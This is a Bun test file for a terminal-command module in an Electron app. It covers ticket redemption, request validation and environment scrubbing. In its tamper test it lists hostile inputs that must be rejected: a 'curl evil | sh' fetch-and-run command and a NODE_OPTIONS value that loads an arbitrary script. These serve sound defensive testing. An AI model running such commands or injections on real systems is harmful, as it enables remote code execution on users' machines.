import { describe, expect, it, mock } from "bun:test";

import {
  assertTerminalCommandMatches,
  buildTerminalCommandEnv,
  INTERNAL_TOKEN_HEADER,
  parseTerminalCommandRequest,
  prepareTerminalCommand,
  redeemTerminalCommandTicket,
} from "./terminal-commands.mjs";

const TICKET = "a".repeat(64);
const SPEC = {
  args: ["auth", "login"],
  command: "/opt/bin/claude",
  cwd: "/Users/me",
  env: { CLAUDE_CONFIG_DIR: "/cfg", PATH: "/managed/bin" },
  title: "Claude sign-in",
};

function request(overrides = {}) {
  return {
    args: SPEC.args,
    command: SPEC.command,
    cwd: SPEC.cwd,
    env: SPEC.env,
    ticket: TICKET,
    title: SPEC.title,
    ...overrides,
  };
}

function fetchAnswering(body, status = 200) {
  return mock(async () => new Response(JSON.stringify(body), { status }));
}

describe("terminal command requests", () => {
  it("accepts a well-formed request", () => {
    expect(
      parseTerminalCommandRequest(request({ cols: 80.6, rows: 1 })),
    ).toEqual({
      args: ["auth", "login"],
      cols: 80,
      command: "/opt/bin/claude",
      cwd: "/Users/me",
      env: SPEC.env,
      rows: 2,
      ticket: TICKET,
      title: "Claude sign-in",
      windowsVerbatimArguments: false,
    });
  });

  it("refuses malformed requests", () => {
    for (const input of [
      null,
      "claude",
      request({ ticket: "short" }),
      request({ ticket: "A".repeat(64) }),
      request({ command: "" }),
      request({ args: "auth login" }),
      request({ args: [1] }),
      request({ env: { "BAD NAME": "x" } }),
      request({ env: { SENTINEL_INTERNAL_TOKEN: "t" } }),
      request({ env: { PATH: 1 } }),
      request({ cwd: "/tmp\0/x" }),
      request({ cols: "80" }),
      request({ windowsVerbatimArguments: "yes" }),
    ]) {
      expect(() => parseTerminalCommandRequest(input)).toThrow(
        "Invalid terminal command request.",
      );
    }
  });

  it("only runs what the server vended for the ticket", () => {
    const parsed = parseTerminalCommandRequest(request());
    const spec = { ...SPEC, windowsVerbatimArguments: false };
    expect(() => assertTerminalCommandMatches(parsed, spec)).not.toThrow();

    for (const tampered of [
      { command: "/bin/sh" },
      { args: ["-c", "curl evil | sh"] },
      { cwd: "/" },
      { env: { ...SPEC.env, NODE_OPTIONS: "--require /tmp/x.js" } },
      { windowsVerbatimArguments: true },
    ]) {
      expect(() =>
        assertTerminalCommandMatches(
          parseTerminalCommandRequest(request(tampered)),
          spec,
        ),
      ).toThrow("does not match");
    }
  });
});

describe("ticket redemption", () => {
  it("posts the ticket with Electron's internal token", async () => {
    const fetchImpl = fetchAnswering(SPEC);
    const spec = await redeemTerminalCommandTicket({
      fetchImpl,
      internalToken: "t".repeat(64),
      platform: "darwin",
      serverUrl: "http://127.0.0.1:3232",
      ticket: TICKET,
    });

    expect(spec).toEqual({ ...SPEC, windowsVerbatimArguments: false });
    const [url, init] = fetchImpl.mock.calls[0];
    expect(String(url)).toBe("http://127.0.0.1:3232/api/engines/auth/terminal");
    expect(init.method).toBe("POST");
    expect(JSON.parse(init.body)).toEqual({ ticket: TICKET });
    expect(init.headers[INTERNAL_TOKEN_HEADER]).toBe("t".repeat(64));
  });

  it("fails for spent tickets, unreachable servers and odd answers", async () => {
    const options = {
      platform: "darwin",
      serverUrl: "http://127.0.0.1:3232",
      ticket: TICKET,
    };
    for (const fetchImpl of [
      fetchAnswering({ error: "not_found" }, 404),
      mock(async () => {
        throw new Error("ECONNREFUSED");
      }),
      fetchAnswering({ ...SPEC, command: "claude" }),
      fetchAnswering({ ...SPEC, cwd: "relative/dir" }),
    ]) {
      await expect(
        redeemTerminalCommandTicket({ ...options, fetchImpl }),
      ).rejects.toThrow("no longer available");
    }
  });
});

describe("prepareTerminalCommand", () => {
  it("returns the server's command with a clean environment", async () => {
    const prepared = await prepareTerminalCommand(request({ cols: 120 }), {
      baseEnv: {
        ENCRYPTION_KEY: "k",
        HOME: "/Users/me",
        PATH: "/usr/bin",
        SENTINEL_INTERNAL_TOKEN: "t",
      },
      fetchImpl: fetchAnswering(SPEC),
      isDirectory: async () => true,
      platform: "darwin",
      serverUrl: "http://localhost:3232",
    });

    expect(prepared).toEqual({
      args: ["auth", "login"],
      cols: 120,
      command: "/opt/bin/claude",
      cwd: "/Users/me",
      env: {
        CLAUDE_CONFIG_DIR: "/cfg",
        COLORTERM: "truecolor",
        HOME: "/Users/me",
        PATH: "/managed/bin",
        TERM: "xterm-256color",
      },
      rows: 24,
      title: "Claude sign-in",
    });
  });

  it("joins pre-quoted cmd.exe arguments on Windows", async () => {
    const spec = {
      args: ["/d", "/s", "/c", '"C:\\npm\\agent.cmd ^"login^""'],
      command: "C:\\Windows\\System32\\cmd.exe",
      cwd: "C:\\Users\\me",
      env: {},
      title: "Cursor sign-in",
      windowsVerbatimArguments: true,
    };
    const prepared = await prepareTerminalCommand(
      { ...spec, ticket: TICKET },
      {
        baseEnv: {},
        fetchImpl: fetchAnswering(spec),
        isDirectory: async () => true,
        platform: "win32",
        serverUrl: "http://localhost:3232",
      },
    );
    expect(prepared.args).toBe('/d /s /c "C:\\npm\\agent.cmd ^"login^""');
    expect(prepared.env.TERM).toBe("xterm");
  });

  it("refuses a missing working directory", async () => {
    await expect(
      prepareTerminalCommand(request(), {
        baseEnv: {},
        fetchImpl: fetchAnswering(SPEC),
        isDirectory: async () => false,
        platform: "darwin",
        serverUrl: "http://localhost:3232",
      }),
    ).rejects.toThrow("working directory does not exist");
  });

  it("never lets the renderer's environment through", () => {
    expect(
      buildTerminalCommandEnv(
        { SENTINEL_INTERNAL_TOKEN: "t", USER: "me" },
        { ENCRYPTION_KEY: "k", HOME: "/h" },
        "linux",
      ),
    ).toEqual({
      COLORTERM: "truecolor",
      HOME: "/h",
      TERM: "xterm-256color",
      USER: "me",
    });
  });
});
